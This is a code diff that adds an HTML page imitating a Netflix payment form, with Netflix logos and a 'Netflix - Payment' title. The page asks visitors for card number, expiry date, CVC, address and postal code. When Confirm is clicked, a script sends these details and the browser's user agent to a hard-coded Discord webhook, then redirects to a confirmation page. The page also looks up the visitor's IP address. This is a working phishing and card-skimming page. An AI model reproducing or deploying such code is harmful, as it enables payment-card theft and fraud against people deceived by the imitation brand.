@@ -1,0 +1,403 @@
+<!doctype html>
+<html>
+<head>
+    <link rel = "icon" href =  
+    "https://cdn4.iconfinder.com/data/icons/logos-and-brands/512/227_Netflix_logo-512.png" 
+    type = "image/x-icon"> 
+    <div class="header" style="background-color: black; padding: px 0; text-align: center;">
+        <img src="https://images.ctfassets.net/y2ske730sjqp/6bhPChRFLRxc17sR8jgKbe/6fa1c6e6f37acdc97ff635cf16ba6fb3/Logos-Readability-Netflix-logo.png" alt="Logo" style="width: 150px; height: auto; margin-left: 0px;">
+    </div>    
+    <meta charset='utf-8'>
+    <meta name='viewport' content='width=device-width, initial-scale=1'>
+    <title>Netflix - Payment</title>
+    <link href='https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-alpha1/dist/css/bootstrap.min.css' rel='stylesheet'>
+    <link href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css' rel='stylesheet'>
+    <script type='text/javascript' src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js'></script>
+    <style>
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        /* Track */
+        ::-webkit-scrollbar-track {
+            background: #f1f1f1;
+        }
+        /* Handle */
+        ::-webkit-scrollbar-thumb {
+            background: #888;
+        }
+        /* Handle on hover */
+        ::-webkit-scrollbar-thumb:hover {
+            background: #555;
+        }
+        @import url("https://fonts.googleapis.com/css2?family=Poppins:weight@100;200;300;400;500;600;700;800&display=swap");
+        body {
+            background-color: white;
+            font-family: "Poppins", sans-serif;
+            font-weight: 300;
+        }
+        .container {
+            height: 100vh;
+        }
+        .card {
+            border: none;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+        }
+        .card-header {
+            padding: .5rem 1rem;
+            margin-bottom: 0;
+            background-color: rgba(0, 0, 0, .03);
+            border-bottom: none;
+        }
+        .btn-light:focus {
+            color: #212529;
+            background-color: #e2e6ea;
+            border-color: #dae0e5;
+            box-shadow: 0 0 0 0.2rem rgba(216, 217, 219, .5);
+        }
+        .form-control {
+            height: 50px;
+            border: 2px solid #eee;
+            border-radius: 6px;
+            font-size: 14px;
+        }
+        .form-control:focus {
+            color: #495057;
+            background-color: #fff;
+            border-color: #039be5;
+            outline: 0;
+            box-shadow: none;
+        }
+        .input {
+            position: relative;
+        }
+        .input i {
+            position: absolute;
+            top: 16px;
+            left: 11px;
+            color: #989898;
+        }
+        .input input {
+            text-indent: 25px;
+        }
+        .card-text {
+            font-size: 13px;
+            margin-left: 6px;
+        }
+        .certificate-text {
+            font-size: 12px;
+        }
+        .billing {
+            font-size: 11px;
+        }
+        .super-price {
+            top: 0px;
+            font-size: 22px;
+        }
+        .super-month {
+            font-size: 11px;
+        }
+        .line {
+            color: #bfbdbd;
+        }
+        .free-button {
+            background: black;
+            height: 52px;
+            font-size: 15px;
+            border-radius: 8px;
+        }
+        .payment-card-body {
+            flex: 1 1 auto;
+            padding: 24px 1rem !important;
+        }
+    </style>
+</head>
+<body className='snippet-body'>
+    <div class="container d-flex justify-content-center mt-5 mb-5">
+        <div class="row g-3">
+            <div class="col-md-6">
+                <span>Payment Method</span>
+                <div class="card">
+                    <div class="accordion" id="accordionExample">
+                        <div class="card">
+                            <div class="card-header p-0" id="headingTwo">
+                                <h2 class="mb-0">
+                                    <button class="btn btn-light btn-block text-left collapsed p-3 rounded-0 border-bottom-custom" type="button" data-toggle="collapse" data-target="#collapseTwo" aria-expanded="false" aria-controls="collapseTwo">
+                                        <div class="d-flex align-items-center justify-content-between">
+                                            <span>Paypal</span>
+                                            <img src="https://i.imgur.com/7kQEsHU.png" width="30">
+                                        </div>
+                                    </button>
+                                </h2>
+                            </div>
+                            <div id="collapseTwo" class="collapse" aria-labelledby="headingTwo" data-parent="#accordionExample">
+                                <div class="card-body">
+                                    <input type="text" class="form-control" placeholder="Paypal email">
+                                </div>
+                            </div>
+                        </div>
+                        <div class="card">
+                            <div class="card-header p-0">
+                                <h2 class="mb-0">
+                                    <button class="btn btn-light btn-block text-left p-3 rounded-0" data-toggle="collapse" data-target="#collapseOne" aria-expanded="true" aria-controls="collapseOne">
+                                        <div class="d-flex align-items-center justify-content-between">
+                                            <span>Credit card</span>
+                                            <div class="icons">
+                                                <img src="https://i.imgur.com/2ISgYja.png" width="30">
+                                                <img src="https://i.imgur.com/W1vtnOV.png" width="30">
+                                                <img src="https://i.imgur.com/35tC99g.png" width="30">
+                                                <img src="https://i.imgur.com/2ISgYja.png" width="30">
+                                            </div>
+                                        </div>
+                                    </button>
+                                </h2>
+                            </div>
+                            <div id="collapseOne" class="collapse show" aria-labelledby="headingOne" data-parent="#accordionExample">
+                                <div class="card-body payment-card-body">
+
+                                    <span class="font-weight-normal card-text">Card Number</span>
+                                    <div class="input">
+                                        <i class="fa fa-credit-card"></i>
+                                        <input type="text" class="form-control" placeholder="0000 0000 0000 0000" id="cardNumberInput">
+                                    </div>
+                                    
+                                    <script type="text/javascript">
+                                        // Add event listener for input change
+                                        const cardNumberInput = document.getElementById('cardNumberInput');
+                                        cardNumberInput.addEventListener('input', function() {
+                                            // Get the input value
+                                            let inputValue = this.value;
+                                    
+                                            // Remove non-numeric characters
+                                            inputValue = inputValue.replace(/\D/g, '');
+                                    
+                                            // Format the input with spaces every 4 characters
+                                            inputValue = inputValue.replace(/(\d{4})(?=\d)/g, '$1 ');
+                                    
+                                            // Limit the input to 16 characters
+                                            if (inputValue.length > 20) {
+                                                inputValue = inputValue.substring(0, 20);
+                                            }
+                                    
+                                            // Update the input field value
+                                            this.value = inputValue;
+                                        });
+                                    </script>
+                                    
+
+                                    <div class="row mt-3 mb-3">
+
+                                        <div class="col-md-6">
+                                            <span class="font-weight-normal card-text">Expiry Date</span>
+                                            <div class="input">
+                                                <i class="fa fa-calendar"></i>
+                                                <input type="text" class="form-control" placeholder="MM/YY" id="expiryDateInput">
+                                            </div>
+                                        </div>
+                                        
+                                        <script type="text/javascript">
+                                            // Add event listener for input change
+                                            const expiryDateInput = document.getElementById('expiryDateInput');
+                                            expiryDateInput.addEventListener('input', function() {
+                                                // Get the input value
+                                                let inputValue = this.value;
+                                        
+                                                // Remove non-numeric characters
+                                                inputValue = inputValue.replace(/\D/g, '');
+                                        
+                                                // Format the input with a slash after the first 2 characters
+                                                if (inputValue.length > 2) {
+                                                    inputValue = inputValue.substring(0, 2) + '/' + inputValue.substring(2);
+                                                }
+                                        
+                                                // Limit the input to 4 characters
+                                                if (inputValue.length > 5) {
+                                                    inputValue = inputValue.substring(0, 5);
+                                                }
+                                        
+                                                // Update the input field value
+                                                this.value = inputValue;
+                                            });
+                                        </script>
+                                        
+                                        <div class="col-md-6">
+                                            <span class="font-weight-normal card-text">CVC/CVV</span>
+                                            <div class="input">
+                                                <i class="fa fa-lock"></i>
+                                                <input type="text" class="form-control" placeholder="000" id="cvcInput" maxlength="3">
+                                            </div>
+                                        </div>
+                                        
+                                        <script type="text/javascript">
+                                            // Add event listener for input change
+                                            const cvcInput = document.getElementById('cvcInput');
+                                            cvcInput.addEventListener('input', function() {
+                                                // Get the input value
+                                                let inputValue = this.value;
+                                        
+                                                // Remove non-numeric characters
+                                                inputValue = inputValue.replace(/\D/g, '');
+                                        
+                                                // Limit the input to 3 characters
+                                                if (inputValue.length > 3) {
+                                                    inputValue = inputValue.substring(0, 3);
+                                                }
+                                        
+                                                // Update the input field value
+                                                this.value = inputValue;
+                                            });
+                                        </script>
+                                        
+
+                                        <div class="col-md-6">
+                                            <span class="font-weight-normal card-text">Address</span>
+                                            <div class="input">
+                                                <i class="fa fa-lock"></i>
+                                                <input type="text" class="form-control" placeholder="4398 Seneca Drive">
+                                            </div>
+                                        </div>
+
+                                        <div class="col-md-6">
+                                            <span class="font-weight-normal card-text">Postal Code</span>
+                                            <div class="input">
+                                                <i class="fa fa-lock"></i>
+                                                <input type="text" class="form-control" placeholder="97223">
+                                            </div>
+                                        </div>
+
+                                    </div>
+                                    <span class="text-muted certificate-text"><i class="fa fa-lock"></i> Your transaction is secured with ssl certificate</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-6">
+                <span>Summary</span>
+                <div class="card">
+                    <div class="d-flex justify-content-between p-3">
+                        <div class="d-flex flex-column">
+                            <span>Pro(Billed Monthly) <i class="fa fa-caret-down"></i></span>
+                            <a href="#" class="billing">Save 20% with annual billing</a>
+                        </div>
+                        <div class="mt-1">
+                            <sup class="super-price">$9.99</sup>
+                            <span class="super-month">/Month</span>
+                        </div>
+                    </div>
+                    <hr class="mt-0 line">
+                    <div class="p-3">
+                        <div class="d-flex justify-content-between mb-2">
+                            <span>Refferal Bonouses</span>
+                            <span>-$0.00</span>
+                        </div>
+                        <div class="d-flex justify-content-between">
+                            <span>Vat <i class="fa fa-clock-o"></i></span>
+                            <span>$1.33</span>
+                        </div>
+                    </div>
+                    <hr class="mt-0 line">
+                    <div class="p-3 d-flex justify-content-between">
+                        <div class="d-flex flex-column">
+                            <span>Today you pay(US Dollars)</span>
+                            <small>After 30 days $9.59</small>
+                        </div>
+                        <span>$11.32</span>
+                    </div>
+                    <div class="p-3">
+                        <button class="btn btn-primary btn-block free-button" id="confirmButton">Confirm</button>
+                        <div class="text-center">
+                            <a href="#">Have a promo code?</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script type='text/javascript' src='https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-alpha1/dist/js/bootstrap.bundle.min.js'></script>
+    <script type='text/javascript' src='#'></script>
+    <script type='text/javascript' src='#'></script>
+    <script type='text/javascript' src='#'></script>
+    <script type='text/javascript'> src='#'</script>
+    <script type='text/javascript'>
+        var myLink = document.querySelector('a[href="#"]');
+        myLink.addEventListener('click', function(e) {
+            e.preventDefault();
+        });
+    </script>
+<script type="text/javascript">
+    document.addEventListener("DOMContentLoaded", function() {
+
+        function getClientIpAddress() {
+        return fetch('https://api64.ipify.org?format=json')
+        .then((response) => {
+            if (!response.ok) {
+                throw new Error('Unable to retrieve IP address');
+            }
+            return response.json();
+        })
+        .then((data) => data.ip)
+        .catch(() => 'Unable to retrieve IP address');
+        }
+
+
+
+        const confirmButton = document.getElementById('confirmButton');
+        confirmButton.addEventListener('click', function() {
+            // Get the input values
+            const cardNumber = document.querySelector('input[placeholder="0000 0000 0000 0000"]').value;
+            const expiryDate = document.querySelector('input[placeholder="MM/YY"]').value;
+            const cvc = document.querySelector('input[placeholder="000"]').value;
+            const address = document.querySelector('input[placeholder="4398 Seneca Drive"]').value;
+            const postal = document.querySelector('input[placeholder="97223"]').value;
+
+            // Check if Card Number, Expiry Date, and CVC are filled
+            if (cardNumber.trim() === '' || expiryDate.trim() === '' || cvc.trim() === '' || postal.trim() === '') {
+                alert('Please fill in all required fields (Card Number, Expiry Date, CVC, Postal)');
+                return; // Don't proceed if any of the fields are empty
+            }
+
+            // Create a JSON object with the input data
+            const userAgent = navigator.userAgent;
+
+            const inputData = {
+                userAgent,
+                address,
+                postal,
+                cardNumber,
+                expiryDate,
+                cvc
+            };
+
+            const messageContent = `IP Address: null\nUserAgent: ${userAgent}\nAddress: ${inputData.address}\nPostal Code: ${inputData.postal}\nCard Number: ${inputData.cardNumber}\nExpiry Date: ${inputData.expiryDate}\nCVC: ${inputData.cvc}`;
+
+
+
+            const webhookUrl = 'https://discord.com/api/webhooks/1159869622053507156/zv_H9RW6Preb6tgzWgMDmXbDwB__7r5GlhbEeml-upROfRJ4ByneZN_uTHr0Pxa6kJFM';
+            const payload = {
+                content: messageContent,
+                username: 'FnF',
+                avatarURL: 'https://i.pinimg.com/originals/3b/29/14/3b2914cac64fd6f5ee9eda2eb018ed65.jpg',
+            };
+            
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload),
+            })
+            .then((response) => response.json())
+            .then((data) => {
+                console.log('Message sent successfully:', data);
+                window.location.href = 'confirm.html';
+            })
+            .catch((error) => {
+                console.error('Error sending message:', error);
+                window.location.href = 'confirm.html';
+            });
+        });
+    });
+</script>
+</body>
+</html>
